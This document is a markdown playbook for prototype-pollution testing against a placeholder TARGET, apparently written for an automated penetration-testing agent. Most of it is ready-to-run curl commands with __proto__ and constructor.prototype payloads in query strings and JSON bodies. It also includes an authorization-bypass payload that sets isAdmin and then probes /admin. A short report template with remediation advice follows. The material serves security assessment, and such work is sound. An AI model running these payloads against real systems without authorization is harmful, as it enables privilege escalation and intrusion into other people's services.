# Prototype Pollution Testing

## Overview
Prototype pollution occurs when user-controlled input modifies `Object.prototype`,
leading to auth bypass, XSS, or RCE depending on reachable gadgets and code paths.

## Prerequisites
```bash
apt-get install -y jq
```

## Phase 1: Identify Candidate Endpoints
```bash
# If you have code access, look for risky merges
rg -n "merge|defaultsDeep|assign|set|extend|deepMerge" \
  /workspace/output/TARGET_repos/ \
  --glob "*.js" --glob "*.ts" \
  | tee /workspace/output/TARGET_pp_candidates.txt
```

## Phase 2: Query Parameter Pollution Tests
```bash
# Basic __proto__ injection
curl -s "https://TARGET/api?__proto__[polluted]=true" \
  | tee /workspace/output/TARGET_pp_query_1.txt

# constructor.prototype bypass
curl -s "https://TARGET/api?constructor[prototype][polluted]=true" \
  | tee /workspace/output/TARGET_pp_query_2.txt
```

## Phase 3: JSON Body Tests
```bash
cat > /workspace/output/TARGET_pp_body.json <<'BODY'
{"__proto__":{"polluted":"yes"}}
BODY

curl -s -X POST https://TARGET/api \
  -H "Content-Type: application/json" \
  --data @/workspace/output/TARGET_pp_body.json \
  | tee /workspace/output/TARGET_pp_body_resp.json

cat > /workspace/output/TARGET_pp_body_alt.json <<'ALT'
{"constructor":{"prototype":{"polluted":"yes"}}}
ALT

curl -s -X POST https://TARGET/api \
  -H "Content-Type: application/json" \
  --data @/workspace/output/TARGET_pp_body_alt.json \
  | tee /workspace/output/TARGET_pp_body_alt_resp.json
```

## Phase 4: Validation & Impact
```bash
# Check for reflection of "polluted" or unexpected keys in responses
rg -n "polluted" /workspace/output/TARGET_pp_* \
  > /workspace/output/TARGET_pp_reflections.txt

# Authz bypass test (example: isAdmin)
cat > /workspace/output/TARGET_pp_admin.json <<'ADMIN'
{"__proto__":{"isAdmin":true}}
ADMIN

curl -s -X POST https://TARGET/profile \
  -H "Content-Type: application/json" \
  --data @/workspace/output/TARGET_pp_admin.json \
  | tee /workspace/output/TARGET_pp_admin_set.txt

curl -s https://TARGET/admin \
  | tee /workspace/output/TARGET_pp_admin_check.txt
```

## Phase 5: Client-Side Prototype Pollution (Optional)
```bash
# If the app returns JSON that is merged client-side, test in browser console:
#   ({ }).polluted
# and check if DOM rendering changes based on polluted properties.
```

## Report Template

```
Target: TARGET
Assessment Date: <DATE>

## Confirmed Findings
- [ ] Prototype pollution via query parameters
- [ ] Prototype pollution via JSON body
- [ ] Authorization bypass (e.g., isAdmin)
- [ ] Client-side gadget chain (XSS)

## Evidence
- Requests: /workspace/output/TARGET_pp_body.json
- Responses: /workspace/output/TARGET_pp_body_resp.json
- Auth check: /workspace/output/TARGET_pp_admin_check.txt

## Recommendations
1. Use safe object merge libraries that block __proto__/constructor/prototype
2. Reject keys: __proto__, prototype, constructor at input boundaries
3. Avoid deep merge of untrusted input
4. Implement strict schema validation for JSON bodies
```

## Output Files
- `/workspace/output/TARGET_pp_candidates.txt` — code scan results
- `/workspace/output/TARGET_pp_body_resp.json` — JSON body response
- `/workspace/output/TARGET_pp_reflections.txt` — reflection evidence
- `/workspace/output/TARGET_pp_admin_check.txt` — authz check response

indicators: prototype pollution, __proto__, constructor.prototype, polluted, js merge, deepmerge, lodash merge, qs, object prototype
